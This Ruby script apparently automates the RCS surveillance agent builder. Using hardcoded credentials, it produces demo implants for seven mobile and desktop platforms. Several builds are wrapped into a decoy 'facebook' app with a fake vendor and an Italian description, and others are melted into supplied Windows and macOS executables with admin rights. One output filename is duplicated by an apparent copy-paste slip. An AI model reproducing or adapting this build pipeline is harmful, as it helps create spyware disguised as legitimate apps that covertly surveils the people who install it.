#!/usr/bin/env ruby
require 'json'

USER = 'alor'
PASS = 'demorcss'
FACTORY = 'RCS_0000000001'

puts "Building all platforms..."
###################################################################################################
params = {platform: 'blackberry',
          binary: {demo: true},
          melt: {appname: 'facebook',
                 name: 'Facebook Application',
                 desc: 'Applicazione utilissima di social network',
                 vendor: 'face inc',
                 version: '1.2.3'},
          package: {type: 'local'}
          }

File.open('build.json', 'w') {|f| f.write params.to_json}
system "ruby ./rcs-core.rb -u #{USER} -p #{PASS} -f #{FACTORY} -b build.json -o blackberry_local.zip" or raise("Failed")
params[:package][:type] = 'remote'
File.open('build.json', 'w') {|f| f.write params.to_json}
system "ruby ./rcs-core.rb -u #{USER} -p #{PASS} -f #{FACTORY} -b build.json -o blackberry_remote.zip" or raise("Failed")

###################################################################################################
###################################################################################################
params = {platform: 'android',
          binary: {demo: true},
          melt: {appname: 'facebook'}
          }

File.open('build.json', 'w') {|f| f.write params.to_json}
system "ruby ./rcs-core.rb -u #{USER} -p #{PASS} -f #{FACTORY} -b build.json -o android.zip" or raise("Failed")

###################################################################################################
###################################################################################################
params = {platform: 'symbian',
          binary: {demo: true},
          melt: {appname: 'facebook'},
          sign: {edition: '5th3rd'},
          }

File.open('build.json', 'w') {|f| f.write params.to_json}
system "ruby ./rcs-core.rb -u #{USER} -p #{PASS} -f #{FACTORY} -b build.json -C symbian.cer -o symbian.zip" or raise("Failed")

###################################################################################################
###################################################################################################
params = {platform: 'ios',
          binary: {demo: true}
          }

File.open('build.json', 'w') {|f| f.write params.to_json}
system "ruby ./rcs-core.rb -u #{USER} -p #{PASS} -f #{FACTORY} -b build.json -o ios.zip" or raise("Failed")

###################################################################################################
###################################################################################################
if RUBY_PLATFORM =~ /mingw/
  params = {platform: 'winmo',
            binary: {demo: true},
            melt: {appname: 'facebook'},
            package: {type: 'local'}
            }

  File.open('build.json', 'w') {|f| f.write params.to_json}
  system "ruby ./rcs-core.rb -u #{USER} -p #{PASS} -f #{FACTORY} -b build.json -o winmo_local.zip" or raise("Failed")
  params[:package][:type] = 'remote'
  File.open('build.json', 'w') {|f| f.write params.to_json}
  system "ruby ./rcs-core.rb -u #{USER} -p #{PASS} -f #{FACTORY} -b build.json -o blackberry_remote.zip" or raise("Failed")
end
###################################################################################################
###################################################################################################
params = {platform: 'osx',
          binary: {demo: true, admin: true}
          }

File.open('build.json', 'w') {|f| f.write params.to_json}
system "ruby ./rcs-core.rb -u #{USER} -p #{PASS} -f #{FACTORY} -b build.json -o osx_default.zip" or raise("Failed")
system "ruby ./rcs-core.rb -u #{USER} -p #{PASS} -f #{FACTORY} -b build.json -i macos_app.zip -o osx_melted.zip" or raise("Failed")

###################################################################################################
###################################################################################################
if RUBY_PLATFORM =~ /mingw/
params = {platform: 'windows',
          binary: {demo: true},
          melt: {admin: true}
          }

File.open('build.json', 'w') {|f| f.write params.to_json}
system "ruby ./rcs-core.rb -u #{USER} -p #{PASS} -f #{FACTORY} -b build.json -o windows_default.zip" or raise("Failed")
system "ruby ./rcs-core.rb -u #{USER} -p #{PASS} -f #{FACTORY} -b build.json -i windows_app.exe -o windows_melted.zip" or raise("Failed")
end
###################################################################################################
puts "End"